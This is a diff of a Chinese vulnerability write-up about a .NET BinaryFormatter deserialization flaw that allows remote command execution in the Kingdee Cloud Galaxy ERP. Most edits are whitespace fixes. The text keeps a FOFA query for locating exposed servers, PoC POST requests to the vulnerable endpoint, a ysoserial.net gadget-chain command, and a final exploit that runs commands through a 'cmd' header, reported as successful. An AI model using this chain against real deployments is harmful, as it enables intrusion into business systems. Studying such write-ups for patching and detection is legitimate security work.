@@ -12,12 +12,12 @@ source: "MrWQ/vulnerability-paper"
 0x01 产品简介
 ---------
 
-     [金蝶云星空](https://so.csdn.net/so/search?q=%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BA&spm=1001.2101.3001.7020)是一款云端企业资源管理（ERP）软件，为企业提供财务管理、供应链管理以及业务流程管理等一体化解决方案。金蝶云 · 星空聚焦多组织，多利润中心的大中型企业，以 “开放、标准、社交” 三大特性为数字经济时代的企业提供开放的 [ERP](https://baike.baidu.com/item/ERP/22997?fromModule=lemma_inlink "ERP") [云平台](https://baike.baidu.com/item/%E4%BA%91%E5%B9%B3%E5%8F%B0/3963188?fromModule=lemma_inlink "云平台")。服务涵盖：财务、供应链、智能制造、阿米巴管理、全渠道营销、电商、HR、企业互联网服务，帮助企业实现数字化营销新生态及管理重构等，提升企业数字化能力。
+     [金蝶云星空](https://so.csdn.net/so/search?q=%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BA&spm=1001.2101.3001.7020)是一款云端企业资源管理（ERP）软件，为企业提供财务管理、供应链管理以及业务流程管理等一体化解决方案。金蝶云 · 星空聚焦多组织，多利润中心的大中型企业，以 “开放、标准、社交” 三大特性为数字经济时代的企业提供开放的 [ERP](https://baike.baidu.com/item/ERP/22997?fromModule=lemma_inlink "ERP") [云平台](https://baike.baidu.com/item/%E4%BA%91%E5%B9%B3%E5%8F%B0/3963188?fromModule=lemma_inlink "云平台")。服务涵盖：财务、供应链、智能制造、阿米巴管理、全渠道营销、电商、HR、企业互联网服务，帮助企业实现数字化营销新生态及管理重构等，提升企业数字化能力。
 
 0x02 漏洞概述
 ---------
 
-    由于金蝶云星空数据通信默认采用的是二进制数据格式，需要进行序列化与反序列化，在此过程中未对数据进行签名或校验，导致客户端发出的数据可被攻击者恶意篡改，写入包含恶意代码的序列化数据，达到在服务端远程命令执行的效果。该漏洞不仅存在于金蝶云星空管理中心（默认 8000 端口），普通应用（默认 80 端口）也存在类似问题。
+    由于金蝶云星空数据通信默认采用的是二进制数据格式，需要进行序列化与反序列化，在此过程中未对数据进行签名或校验，导致客户端发出的数据可被攻击者恶意篡改，写入包含恶意代码的序列化数据，达到在服务端远程命令执行的效果。该漏洞不仅存在于金蝶云星空管理中心（默认 8000 端口），普通应用（默认 80 端口）也存在类似问题。
 
 0x03 影响范围
 ---------
@@ -28,25 +28,25 @@ source: "MrWQ/vulnerability-paper"
 
 8.x 版本：8.0.0.202205 至 8.1.0.20221110
 
-0x04 复现环境
+0x04 复现环境
 ---------
 
 FOFA：app="金蝶云星空 - 管理中心"
 
-![](https://img-blog.csdnimg.cn/d849411ea6a04a86a75802b751a8b21f.png)​
+![](https://img-blog.csdnimg.cn/d849411ea6a04a86a75802b751a8b21f.png)
 
-0x05 漏洞复现 
+0x05 漏洞复现 
 ----------
 
- 简单的分析了一下漏洞，属于. net 反序列化场景中的 BinaryFormatter 反序列化，BinaryFormatter 位于命名空间 System.Runtime.Serialization.Formatters.Binary 它是直接用二进制方式把对象进行序列化，优点是速度较快，在不同版本的. NET 平台里都可以兼容。但是使用反序列化不受信任的二进制文件会导致反序列化漏洞从而实现远程 RCE 攻击。
+ 简单的分析了一下漏洞，属于. net 反序列化场景中的 BinaryFormatter 反序列化，BinaryFormatter 位于命名空间 System.Runtime.Serialization.Formatters.Binary 它是直接用二进制方式把对象进行序列化，优点是速度较快，在不同版本的. NET 平台里都可以兼容。但是使用反序列化不受信任的二进制文件会导致反序列化漏洞从而实现远程 RCE 攻击。
 
-本次复现需要使用 ysoserial.net 工具构造恶意序列化数据实现 RCE 
+本次复现需要使用 ysoserial.net 工具构造恶意序列化数据实现 RCE 
 
 工具地址：[https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net "https://github.com/pwntester/ysoserial.net")
 
-![](https://img-blog.csdnimg.cn/fa493a51199940afadf79cd9140577c1.png)​
+![](https://img-blog.csdnimg.cn/fa493a51199940afadf79cd9140577c1.png)
 
- PoC
+ PoC
 
 ```
 POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1
@@ -58,16 +58,16 @@ Content-Type: text/json
 
 ![](https://img-blog.csdnimg.cn/67d3f02801084855b596f12e8637948a.png)
 
- 可以发现请求体 ap0 参数构造任意字符串发起请求时会出现序列化异常，这种情况则存在漏洞
+ 可以发现请求体 ap0 参数构造任意字符串发起请求时会出现序列化异常，这种情况则存在漏洞
 
-使用 ysoserial.net 工具构造 Payload
+使用 ysoserial.net 工具构造 Payload
 
 ```
  .\ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "a.cs;System.Windows.Forms.dll;System.Web.dll;System.dll"
 
 ```
 
-命令中  -f 指定的是. net 程序中的序列化类，-g 是 ysoserial.net 工具中的攻击链， 这里指定的是 ActivitySurrogateSelectorFromFile 链，这个攻击链可加载自定义的程序集。-c 是构造的程序集（a.cs），后面的 dll 文件是. NET Framework 中的一个核心 DLL 文件，包含了一些相关的类和方法 (自行加载，不需要构造)
+命令中  -f 指定的是. net 程序中的序列化类，-g 是 ysoserial.net 工具中的攻击链， 这里指定的是 ActivitySurrogateSelectorFromFile 链，这个攻击链可加载自定义的程序集。-c 是构造的程序集（a.cs），后面的 dll 文件是. NET Framework 中的一个核心 DLL 文件，包含了一些相关的类和方法 (自行加载，不需要构造)
 
 编写一个从请求头中获取参数执行命令的 ASP.NET 程序
 
@@ -104,7 +104,7 @@ PS：通过接收 HTTP 请求中的 cmd 参数，将其作为命令行参数传�
 
 ![](https://img-blog.csdnimg.cn/9abf9ab59e284b41a6b87305352547fc.png)
 
- 最终 exp:
+ 最终 exp:
 
 ```
 POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1
@@ -117,7 +117,7 @@ cmd: dir
 
 ![](https://img-blog.csdnimg.cn/10ab444172cb4c6395b5ab96fe40a1ac.png)
 
- 利用成功
+ 利用成功
 
 0x06 修复建议
 ---------
